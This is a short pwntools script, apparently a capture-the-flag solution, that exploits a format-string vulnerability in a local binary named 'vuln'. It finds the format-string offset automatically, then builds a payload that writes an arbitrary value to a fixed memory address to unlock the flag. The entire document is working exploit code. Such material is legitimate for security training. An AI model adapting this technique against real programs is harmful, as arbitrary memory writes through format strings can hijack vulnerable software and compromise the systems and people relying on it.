from pwn import *


program = "./vuln"
context.binary = ELF(program)


def exec_fmt(payload):
    p = process(program)
    p.sendline(payload)
    print(payload)
    return p.recvall()

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset

p = process(program)
payload = fmtstr_payload(offset, {0x404060: 0x67616c66})

p.sendline(payload)
flag = p.recvall()

print(flag)
